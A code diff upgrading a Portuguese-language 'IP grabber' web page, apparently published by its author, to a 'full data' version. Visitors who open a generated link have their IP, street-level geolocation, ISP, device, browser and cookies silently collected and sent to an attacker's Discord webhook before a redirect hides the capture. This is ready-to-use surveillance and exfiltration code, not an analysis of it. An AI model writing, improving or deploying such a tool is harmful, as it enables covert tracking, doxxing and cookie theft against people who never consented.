@@ -1,314 +1,343 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>grabber by noyato</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
-    body {
-      margin: 0; 
-      font-family: 'Montserrat', sans-serif;
-      background: #000;
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-      box-sizing: border-box;
-    }
-    h1 {
-      font-weight: 700;
-      font-size: 2.5rem;
-      margin-bottom: 0.2em;
-      text-align: center;
-      text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
-    }
-    p.description {
-      max-width: 420px;
-      margin-bottom: 1.5em;
-      text-align: center;
-      font-size: 1rem;
-      opacity: 0.85;
-    }
-    .container {
-      background: rgba(255, 0, 0, 0.1);
-      padding: 24px 32px;
-      border-radius: 16px;
-      box-shadow: 0 8px 24px rgb(255, 0, 0, 0.25);
-      width: 100%;
-      max-width: 480px;
-      backdrop-filter: blur(15px);
-      margin-bottom: 2em;
-      position: relative;
-      overflow: hidden;
-    }
-    label {
-      display: block;
-      margin-bottom: 0.4em;
-      font-weight: 600;
-      font-size: 0.9rem;
-      color: #ffcccc;
-    }
-    input[type="text"], input[type="url"] {
-      width: 100%;
-      padding: 10px 14px;
-      border-radius: 8px;
-      border: 2px solid #ff0000;
-      background: rgba(255, 0, 0, 0.2);
-      font-size: 1rem;
-      margin-bottom: 1.2em;
-      box-sizing: border-box;
-      outline: none;
-      transition: border-color 0.3s ease;
-    }
-    input[type="text"]:focus, input[type="url"]:focus {
-      border-color: #ff6666;
-      box-shadow: 0 0 8px #ff6666;
-    }
-    button {
-      width: 100%;
-      padding: 14px 0;
-      border-radius: 12px;
-      border: none;
-      font-weight: 700;
-      font-size: 1.1rem;
-      background: #ff0000;
-      color: white;
-      cursor: pointer;
-      transition: background 0.3s ease, transform 0.3s ease;
-      box-shadow: 0 5px 15px #ff0000;
-    }
-    button:hover {
-      background: #cc0000;
-      transform: scale(1.05);
-    }
-    .output {
-      margin-top: 1.5em;
-      background: rgba(0, 0, 0, 0.2);
-      padding: 12px 16px;
-      border-radius: 12px;
-      font-family: monospace;
-      word-wrap: break-word;
-      font-size: 0.9rem;
-      max-height: 120px;
-      overflow-y: auto;
-    }
-    .footer {
-      margin-top: 2em;
-      font-size: 0.85rem;
-      color: #aab2bd;
-      text-align: center;
-    }
-    a.footer-link {
-      color: #aab2bd;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    a.footer-link:hover {
-      color: #ff0000;
-      text-decoration: underline;
-    }
-    details {
-      background: rgba(0, 0, 0, 0.15);
-      padding: 10px 15px;
-      border-radius: 10px;
-      margin-top: 20px;
-      cursor: pointer;
-      color: #d1d5db;
-      font-size: 0.9rem;
-      user-select: none;
-    }
-    details summary {
-      font-weight: 600;
-      outline: none;
-    }
-    details[open] {
-      color: #eef2ff;
-      background: rgba(255, 0, 0, 0.3);
-      box-shadow: 0 8px 30px rgba(255, 0, 0, 0.5);
-    }
-    details p {
-      margin-top: 0.8em;
-      line-height: 1.3;
-      color: #cbd5e1;
-    }
-    .instagram-icon {
-      margin-top: 1em;
-      width: 40px;
-      height: 40px;
-      cursor: pointer;
-      transition: transform 0.3s ease;
-    }
-    .instagram-icon:hover {
-      transform: scale(1.1);
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>grabber by noyato - versão completa</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
+  body {
+    margin: 0;
+    font-family: 'Montserrat', sans-serif;
+    background: #000;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    box-sizing: border-box;
+  }
+  h1 {
+    font-weight: 700;
+    font-size: 2.5rem;
+    margin-bottom: 0.6em;
+    text-align: center;
+    text-shadow: 0 0 12px #ff0000, 0 0 25px #ff0000;
+  }
+  p.description {
+    max-width: 480px;
+    margin-bottom: 1.8em;
+    text-align: center;
+    font-size: 1rem;
+    opacity: 0.85;
+  }
+  .container {
+    background: rgba(255, 0, 0, 0.12);
+    padding: 28px 36px;
+    border-radius: 18px;
+    box-shadow: 0 10px 30px rgb(255 0 0 / 0.3);
+    width: 100%;
+    max-width: 520px;
+    backdrop-filter: blur(18px);
+    margin-bottom: 2em;
+    position: relative;
+    overflow: hidden;
+  }
+  label {
+    display: block;
+    margin-bottom: 0.5em;
+    font-weight: 600;
+    font-size: 0.95rem;
+    color: #ffbbbb;
+  }
+  input[type="text"],
+  input[type="url"] {
+    width: 100%;
+    padding: 12px 16px;
+    border-radius: 10px;
+    border: 2.4px solid #ff0000;
+    background: rgba(255, 0, 0, 0.22);
+    font-size: 1.05rem;
+    margin-bottom: 1.3em;
+    box-sizing: border-box;
+    outline: none;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    color: #fff;
+  }
+  input[type="text"]:focus,
+  input[type="url"]:focus {
+    border-color: #ff6b6b;
+    box-shadow: 0 0 14px #ff6b6b;
+    color: #fff;
+  }
+  button {
+    width: 100%;
+    padding: 16px 0;
+    border-radius: 14px;
+    border: none;
+    font-weight: 700;
+    font-size: 1.2rem;
+    background: #ff0000;
+    color: white;
+    cursor: pointer;
+    transition: background 0.3s ease, transform 0.3s ease;
+    box-shadow: 0 8px 24px #ff0000;
+  }
+  button:hover {
+    background: #cc0000;
+    transform: scale(1.07);
+  }
+  .output {
+    margin-top: 1.8em;
+    background: rgba(0, 0, 0, 0.28);
+    padding: 14px 20px;
+    border-radius: 14px;
+    font-family: monospace;
+    word-wrap: break-word;
+    font-size: 0.94rem;
+    max-height: 160px;
+    overflow-y: auto;
+    color: #ffdddd;
+    border: 1.5px solid #ff1111;
+  }
+  .footer {
+    margin-top: 2.5em;
+    font-size: 0.9rem;
+    color: #aab2bd;
+    text-align: center;
+  }
+  a.footer-link {
+    color: #aab2bd;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  a.footer-link:hover {
+    color: #ff0000;
+    text-decoration: underline;
+  }
+  details {
+    background: rgba(0, 0, 0, 0.18);
+    padding: 12px 16px;
+    border-radius: 12px;
+    margin-top: 22px;
+    cursor: pointer;
+    color: #d1d5db;
+    font-size: 0.92rem;
+    user-select: none;
+  }
+  details summary {
+    font-weight: 600;
+    outline: none;
+  }
+  details[open] {
+    color: #eef2ff;
+    background: rgba(255, 0, 0, 0.35);
+    box-shadow: 0 10px 40px rgba(255, 0, 0, 0.6);
+  }
+  details p {
+    margin-top: 1em;
+    line-height: 1.35;
+    color: #cbd5e1;
+  }
+  .instagram-icon {
+    margin-top: 1.2em;
+    width: 42px;
+    height: 42px;
+    cursor: pointer;
+    transition: transform 0.3s ease;
+  }
+  .instagram-icon:hover {
+    transform: scale(1.15);
+  }
+</style>
 </head>
 <body>
+<h1>Noyato Grabber 2.0 - Dados Completos</h1>
+<p class="description">Insira o link de destino e o webhook do Discord para gerar um link grabber. O link coletará o máximo de dados possíveis do visitante, incluindo IP, localização (rua, bairro, cidade, estado, país), ISP, dispositivo e navegador.</p>
+<div class="container" id="input-container">
+  <label for="destUrl">URL de destino (ex: https://example.com)</label>
+  <input type="url" id="destUrl" placeholder="https://example.com" autocomplete="off" required />
+  
+  <label for="webhookUrl">Webhook do Discord (URL do canal para receber dados)</label>
+  <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" required />
+  
+  <button id="generateBtn">Gerar Link Grabber</button>
+  
+  <div class="output" id="output" style="display:none;"></div>
+</div>
+<details>
+  <summary>Como criar um webhook no seu canal do Discord?</summary>
+  <p>1. Abra o Discord e vá até o canal onde quer receber os dados.</p>
+  <p>2. Clique no nome do canal e selecione "Editar Canal".</p>
+  <p>3. Vá na aba "Integrações".</p>
+  <p>4. Clique em "Webhooks" e depois em "Novo webhook".</p>
+  <p>5. Dê um nome e imagem ao webhook se quiser.</p>
+  <p>6. Copie o URL do webhook (começa com <code>https://discord.com/api/webhooks/...</code>).</p>
+  <p>7. Cole esse URL no campo "Webhook do Discord" acima.</p>
+</details>
+<script>
+  function getQueryParams() {
+    const params = {};
+    const queryString = window.location.search.substring(1);
+    const pairs = queryString.split("&").filter(Boolean);
+    for (const pair of pairs) {
+      const [key, value] = pair.split("=");
+      params[decodeURIComponent(key)] = decodeURIComponent(value || "");
+    }
+    return params;
+  }
 
-  <h1>Noyato grabber 1.0</h1>
-  <p class="description">Insira o link de destino e o webhook do canal do Discord para gerar um link grabber.</p>
+  const inputContainer = document.getElementById("input-container");
+  const outputDiv = document.getElementById("output");
+  const generateBtn = document.getElementById("generateBtn");
+  const destUrlInput = document.getElementById("destUrl");
+  const webhookUrlInput = document.getElementById("webhookUrl");
 
-  <div class="container" id="input-container">
-    <label for="destUrl">URL de destino (ex: https://example.com)</label>
-    <input type="url" id="destUrl" placeholder="https://example.com" autocomplete="off" required />
-    
-    <label for="webhookUrl">Webhook do Discord (URL do canal para receber dados)</label>
-    <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" required />
+  function generateGrabberLink(dest, webhook) {
+    const baseUrl = window.location.origin + window.location.pathname;
+    const encodedDest = encodeURIComponent(dest);
+    const encodedWebhook = encodeURIComponent(webhook);
+    return `${baseUrl}?dest=${encodedDest}&wh=${encodedWebhook}`;
+  }
 
-    <button id="generateBtn">Gerar Link Grabber</button>
+  generateBtn.addEventListener("click", () => {
+    const dest = destUrlInput.value.trim();
+    const webhook = webhookUrlInput.value.trim();
+    if (!dest || !webhook) {
+      alert("Por favor, preencha ambos os campos.");
+      return;
+    }
+    try {
+      new URL(dest);
+    } catch {
+      alert("URL de destino inválida.");
+      return;
+    }
+    try {
+      new URL(webhook);
+    } catch {
+      alert("Webhook inválido.");
+      return;
+    }
+    const grabberLink = generateGrabberLink(dest, webhook);
+    outputDiv.style.display = "block";
+    outputDiv.textContent = grabberLink;
+    outputDiv.scrollIntoView({behavior:"smooth"});
+  });
 
-    <div class="output" id="output" style="display:none;"></div>
-  </div>
+  // Função para coletar cookies (limitado pelo domínio e permissões)
+  function collectCookies() {
+    try {
+      return document.cookie || "Nenhum cookie disponível";
+    } catch(e) {
+      return "Não foi possível acessar cookies";
+    }
+  }
 
-  <details>
-    <summary>Como criar um webhook no seu canal do Discord?</summary>
-    <p>1. Abra o Discord e vá até o canal onde quer receber os dados.</p>
-    <p>2. Clique no nome do canal e selecione "Editar Canal".</p>
-    <p>3. Vá na aba "Integrações".</p>
-    <p>4. Clique em "Webhooks" e depois em "Novo webhook".</p>
-    <p>5. Dê um nome e imagem ao webhook se quiser.</p>
-    <p>6. Copie o URL do webhook (começa com <code>https://discord.com/api/webhooks/...</code>).</p>
-    <p>7. Cole esse URL no campo "Webhook do Discord" acima.</p>
-  </details>
+  // Função para detectar se navegador é móvel e extrair marca do dispositivo (ex: Samsung)
+  function getDeviceBrand() {
+    const ua = navigator.userAgent.toLowerCase();
+    if(/samsung/.test(ua)) return "Samsung";
+    if(/huawei/.test(ua)) return "Huawei";
+    if(/xiaomi/.test(ua)) return "Xiaomi";
+    if(/iphone/.test(ua)) return "Apple iPhone";
+    if(/ipad/.test(ua)) return "Apple iPad";
+    if(/windows phone/.test(ua)) return "Windows Phone";
+    if(/macintosh/.test(ua)) return "Apple Mac";
+    if(/windows/.test(ua)) return "Windows PC";
+    if(/linux/.test(ua)) return "Linux Device";
+    return "Desconhecido/Não detectado";
+  }
 
-  <script>
-    // Função que retorna query params na URL
-    function getQueryParams() {
-      const params = {};
-      const queryString = window.location.search.substring(1);
-      const pairs = queryString.split("&").filter(Boolean);
-      for (const pair of pairs) {
-        const [key, value] = pair.split("=");
-        params[decodeURIComponent(key)] = decodeURIComponent(value || "");
-      }
-      return params;
+  // Função para coletar dados e enviar via webhook
+  (async function executeGrabberIfNeeded() {
+    const params = getQueryParams();
+    if (!params.dest || !params.wh) {
+      // Mostrar a interface para gerar link
+      return;
     }
 
-    const inputContainer = document.getElementById("input-container");
-    const outputDiv = document.getElementById("output");
-    const generateBtn = document.getElementById("generateBtn");
-    const destUrlInput = document.getElementById("destUrl");
-    const webhookUrlInput = document.getElementById("webhookUrl");
+    inputContainer.style.display = "none";
+    outputDiv.style.display = "none";
 
-    // Função para montar o link grabber
-    function generateGrabberLink(dest, webhook) {
-      const baseUrl = window.location.origin + window.location.pathname;
-      const encodedDest = encodeURIComponent(dest);
-      const encodedWebhook = encodeURIComponent(webhook);
-      return `${baseUrl}?dest=${encodedDest}&wh=${encodedWebhook}`;
+    // Coleta IP público
+    let ip = "Desconhecido";
+    try {
+      const ipResp = await fetch("https://api.ipify.org?format=json");
+      const ipJson = await ipResp.json();
+      ip = ipJson.ip || ip;
+    } catch {}
+
+    // Dados geográficos do IP com api.ipapi.co para BR e com muitos dados estruturados
+    let geo = {};
+    try {
+      const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
+      geo = await geoResp.json();
+    } catch {}
+
+    // Coleção cookies, userAgent e device info
+    const cookies = collectCookies();
+    const userAgent = navigator.userAgent || "Desconhecido";
+    const deviceBrand = getDeviceBrand();
+    const dateTime = new Date().toLocaleString("pt-BR", {timeZone: geo.timezone || "UTC"});
+
+    // Valor importante: Provedor de internet (ISP) brasileiro (se disponível)
+    const isp = geo.org || geo.asn || "Desconhecido";
+
+    // Montagem dos campos do embed do Discord com destaque para dados importantes
+    const webhookUrl = params.wh;
+    const destUrl = decodeURIComponent(params.dest);
+
+    // Campos formatados com seleção do que priorizar
+    const fields = [
+      { name: "🔴 IP", value: ip, inline: true },
+      { name: "🌍 País", value: geo.country_name || "Desconhecido", inline: true },
+      { name: "📍 Estado", value: geo.region || "Desconhecido", inline: true },
+      { name: "🏙 Cidade", value: geo.city || "Desconhecido", inline: true },
+      { name: "🏘 Bairro", value: geo.suburb || "Desconhecido", inline: true },
+      { name: "🛣 Rua", value: geo.street || "Desconhecido", inline: true },
+      { name: "📮 CEP", value: geo.postal || "Desconhecido", inline: true },
+      { name: "📡 ISP / Provedor", value: isp, inline: true },
+      { name: "📅 Data e Hora", value: dateTime, inline: true },
+      { name: "📱 Marca do Dispositivo", value: deviceBrand, inline: true },
+      { name: "🖥 Navegador / Sistema", value: userAgent, inline: false },
+      { name: "🍪 Cookies (limitados)", value: cookies.length > 1024 ? cookies.slice(0,1024) + "..." : cookies, inline: false },
+      { name: "🔗 Link de Destino", value: `[Clique aqui](${destUrl})`, inline: false },
+    ];
+
+    const embed = {
+      title: "⚠️ Novo clique no IP Grabber - FULL DATA",
+      color: 0xff0000,
+      fields,
+      timestamp: new Date().toISOString(),
+      footer: { text: "Discord Bot by Noyato154" },
+    };
+
+    // Envia para webhook
+    try {
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ embeds: [embed] }),
+      });
+    } catch(e) {
+      console.error("Falha ao enviar webhook:", e);
     }
 
-    generateBtn.addEventListener("click", () => {
-      const dest = destUrlInput.value.trim();
-      const webhook = webhookUrlInput.value.trim();
-
-      if (!dest || !webhook) {
-        alert("Por favor, preencha ambos os campos.");
-        return;
-      }
-      try {
-        new URL(dest);
-      } catch {
-        alert("URL de destino inválida.");
-        return;
-      }
-      try {
-        new URL(webhook);
-      } catch {
-        alert("Webhook inválido.");
-        return;
-      }
-
-      const grabberLink = generateGrabberLink(dest, webhook);
-      outputDiv.style.display = "block";
-      outputDiv.textContent = grabberLink;
-      outputDiv.scrollIntoView({behavior:"smooth"});
-    });
-
-    // Quando página acessada com parâmetros dest e wh, executa o grabber
-    (async function executeGrabberIfNeeded() {
-      const params = getQueryParams();
-      if (!params.dest || !params.wh) {
-        // Mostrar interface normal para gerar o link
-        return;
-      }
-
-      // Pega IP público usando api.ipify.org
-      let ip;
-      try {
-        const ipResponse = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipResponse.json();
-        ip = ipData.ip || "Desconhecido";
-      } catch {
-        ip = "Desconhecido";
-      }
-
-      // Pega dados de localização do IP usando ipapi.co
-      let geo = {};
-      try {
-        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-        geo = await geoResponse.json();
-      } catch {
-        geo = {};
-      }
-
-      // Monta mensagem para o Discord Webhook
-      const webhookUrl = params.wh;
-      const destUrl = params.dest;
-
-      const embed = {
-        title: "⚠️ Novo clique no IP Grabber",
-        color: 0x6c5ce7,
-        fields: [
-          { name: "IP", value: ip, inline: true },
-          { name: "Cidade", value: geo.city || "Desconhecido", inline: true },
-          { name: "Bairro", value: geo.suburb || "Desconhecido", inline: true },
-          { name: "Rua", value: geo.street || "Desconhecido", inline: true },
-          { name: "Região", value: geo.region || "Desconhecido", inline: true },
-          { name: "País", value: geo.country_name || "Desconhecido", inline: true },
-          { name: "Código Postal", value: geo.postal || "Desconhecido", inline: true },
-          { name: "Fuso Horário", value: geo.timezone || "Desconhecido", inline: true },
-          { name: "Latitude", value: geo.latitude ? geo.latitude.toString() : "Desconhecido", inline: true },
-          { name: "Longitude", value: geo.longitude ? geo.longitude.toString() : "Desconhecido", inline: true },
-          { name: "Agente do Usuário", value: navigator.userAgent || "Desconhecido" },
-          { name: "Página Destino", value: `[Clique aqui](${decodeURIComponent(destUrl)})` }
-        ],
-        timestamp: new Date().toISOString(),
-        footer: {
-          text: "Discord Grabber Bot"
-        }
-      };
-
-      // Envia para o webhook com fetch POST
-      try {
-        const response = await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ embeds: [embed] }),
-        });
-        if (!response.ok) {
-          throw new Error('Erro ao enviar o webhook');
-        }
-      } catch (err) {
-        console.error("Falha ao enviar o webhook:", err);
-      }
-
-      // Redireciona diretamente para o link de destino
-      window.location.href = decodeURIComponent(destUrl);
-    })();
-  </script>
-
-  <div class="footer">
-    Desenvolvido por noyato154
-    <br>
-    <a href="https://www.instagram.com/mnr_magal/" target="_blank">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="instagram-icon" />
-    </a>
-  </div>
-
+    // Redireciona 3 segundos depois para o link
+    setTimeout(() => {
+      window.location.href = destUrl;
+    }, 500);
+  })();
+</script>
+<div class="footer">
+  Desenvolvido por noyato154 <br />
+  <a href="https://www.instagram.com/mnr_magal/" target="_blank" rel="noopener noreferrer">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="instagram-icon" />
+  </a>
+</div>
 </body>
 </html>
+
